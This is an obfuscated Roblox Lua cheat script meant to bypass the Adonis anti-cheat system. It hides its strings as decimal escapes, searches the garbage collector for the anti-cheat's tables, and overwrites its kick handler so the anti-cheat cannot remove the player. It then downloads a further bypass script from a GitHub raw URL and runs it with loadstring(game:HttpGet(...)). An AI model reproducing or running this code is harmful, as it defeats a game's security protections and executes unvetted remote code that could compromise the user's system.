do
    local function _x(str)
        return (str:gsub("\\(%d+)", function(n)
            return string.char(tonumber(n))
        end))
    end

    local _a = function(...) return (...) end
    local _b = task.wait or wait

    _b(5)

    local _p = print
    _p(_x("\65\100\111\110\105\115\32\66\121\112\97\115\115\46\46\46"))

    local function _c()
        for _i,_v in pairs(getgc(true)) do
            local _ok,_res = pcall(function()
                return rawget(_v, _x("\105\110\100\101\120\73\110\115\116\97\110\99\101"))
            end)

            if _ok and type(_res) == _x("\116\97\98\108\101") then
                local _t = _res
                if _t[1] == _x("\107\105\99\107") then
                    pcall(function()
                        setreadonly(_v, false)
                        _v[_x("\116\118\107")] = {
                            _x("\107\105\99\107"),
                            function()
                                return game[_x("\87\111\114\107\115\112\97\99\101")]:WaitForChild(_x(""))
                            end
                        }
                    end)
                end
            end
        end
    end

    _c()
    _p(_x("\66\121\112\97\115\115\32\49\32\76\111\97\100\101\100"))

    _b(3)

    local function _d(u)
        return loadstring(game:HttpGet(u))()
    end

    _d(_x("\104\116\116\112\115\58\47\47\114\97\119\46\103\105\116\104\117\98\117\115\101\114\99\111\110\116\101\110\116\46\99\111\109\47\120\105\97\111\109\97\111\56\48\57\48\47\65\100\111\110\105\115\45\66\121\112\97\115\115\45\70\114\97\109\101\119\111\114\107\47\109\97\115\116\101\114\47\65\100\111\110\105\115\66\121\112\97\115\115\46\108\117\97"))

    _p(_x("\70\114\97\109\101\119\111\114\107\32\76\111\97\100\101\100"))

    _b(1)

    local _msg = {
        "\61\61\61\61\61\61\61\61\61\61\61\61\61\61\61\61\61\61\61\61\61",
        "\65\100\111\110\105\115\32\66\121\112\97\115\115\32\67\111\109\112\108\101\116\101",
        "\61\61\61\61\61\61\61\61\61\61\61\61\61\61\61\61\61\61\61\61\61"
    }

    for _,v in ipairs(_msg) do
        _p(_x(v))
    end

    -- junk
    local function _junk()
        local t = 0
        for i=1,math.random(3,7) do
            t = t + i
        end
        return t
    end

    _junk()
end
